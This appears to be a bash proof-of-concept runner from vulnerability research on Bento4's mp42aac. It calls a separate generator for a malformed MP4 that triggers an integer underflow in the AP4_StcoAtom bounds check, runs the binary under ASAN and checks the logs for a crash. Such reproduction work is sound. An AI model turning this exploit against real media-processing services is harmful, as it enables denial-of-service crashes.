#!/usr/bin/env bash
# PoC runner for VULN-003: AP4_StcoAtom integer underflow in bounds check.
# Triggers bad_alloc via huge allocation from unsigned underflow.
#
# NOTE: On systems with >4GB free RAM (like this 1TB system), the ~4GB
# allocation succeeds by default. We use ASAN's mmap_limit_mb=3072 to cap
# total non-shadow mmap at 3GB, forcing the huge ~4GB allocation to fail and
# producing a detectable ASAN abort (AddressSanitizer: allocation-size-too-big
# or AddressSanitizer: out-of-memory).

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Apps_Mp42Aac_Mp42Aac_cpp"
MP4="$POC_DIR/vuln_003.mp4"
RESULT="$POC_DIR/vuln_003_result.txt"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"

echo "=== VULN-003 PoC: AP4_StcoAtom integer underflow ===" | tee "$RESULT"
echo "Date: $(date)" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 1: Generate the malicious MP4
echo "[*] Generating vuln_003.mp4 ..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_003_gen.py" | tee -a "$RESULT"
echo "" | tee -a "$RESULT"

# Step 2: Run mp42aac with ASAN+UBSAN enabled.
# mmap_limit_mb=3072 caps non-shadow mmap at 3 GB so the underflowed
# entry_count of 0x3FFFFFFF (~4 GB allocation) is detected and aborted.
echo "[*] Running mp42aac (mmap_limit_mb=3072 to force allocation failure) ..." | tee -a "$RESULT"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}:mmap_limit_mb=3072" \
    "$BINARY" "$MP4" /dev/null \
    >> "$RESULT" 2>&1 || true
echo "" | tee -a "$RESULT"

# Step 3: Collect ASAN/UBSAN output from log files
echo "[*] ASAN/UBSAN log output:" | tee -a "$RESULT"
found_log=0
# Sort by modification time (newest first) to get the log from this run
for log in $(ls -t "${ASAN_LOG_PREFIX}".* 2>/dev/null); do
    if [ -f "$log" ]; then
        echo "--- $log ---" | tee -a "$RESULT"
        cat "$log" | tee -a "$RESULT"
        found_log=1
        break  # Only show the most recent log (from this run)
    fi
done
if [ "$found_log" -eq 0 ]; then
    echo "(no asan.log.* files found)" | tee -a "$RESULT"
fi
echo "" | tee -a "$RESULT"

# Step 4: Summary
# Check ASAN log files and binary output (not the gen.py echoed lines) for crash evidence
echo "[*] Result summary:" | tee -a "$RESULT"
crash_found=0
for log in $(ls -t "${ASAN_LOG_PREFIX}".* 2>/dev/null); do
    if [ -f "$log" ]; then
        if grep -qE "AddressSanitizer|ABORTING|allocation-size-too-big|out-of-memory|mmap_limit_mb|total_mmaped|terminate called|SIGABRT" "$log" 2>/dev/null; then
            crash_found=1
        fi
    fi
done
if [ "$crash_found" -eq 1 ]; then
    echo "  => CRASH / ASAN ERROR DETECTED (see asan.log above)" | tee -a "$RESULT"
else
    echo "  => No ASAN crash signal in logs (check manually)" | tee -a "$RESULT"
fi

echo ""
echo "[+] Done. See: $RESULT"
